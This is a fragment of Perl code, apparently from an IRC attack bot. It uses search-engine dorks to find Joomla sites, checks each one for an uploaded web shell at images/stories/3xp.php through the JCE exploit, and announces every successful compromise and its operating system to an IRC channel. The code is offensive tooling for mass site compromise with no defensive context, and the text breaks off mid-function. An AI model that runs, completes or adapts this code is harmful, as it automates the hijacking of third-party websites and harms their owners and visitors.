sub jce_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jcelogo);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$chan","$jcelogo15$engine 9Finished 15for 9$dork "); }
 			my $jceshell = "http://".$site."images/stories/3xp.php";

			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
my $nama = $simpan;
 			my $cek  = &get_content($jceshell);
 			if ($cek =~ /GIF89GHZ/) {
 			if ($cek =~ m/<\/title>(.*?)<form action/g) {$safe = $1;}
 			
				&msg("$chan","$jcelogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (OS=$safe) ");
